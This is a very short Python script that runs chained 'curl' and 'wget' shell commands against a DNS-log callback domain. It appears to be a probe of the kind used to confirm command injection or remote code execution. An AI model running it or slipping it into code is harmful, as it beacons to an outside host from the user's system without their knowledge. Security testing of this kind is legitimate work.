import subprocess

result = subprocess.run("curl 8028beef.dnslog.store;wget 8028beef.dnslog.store", shell=True, check=True)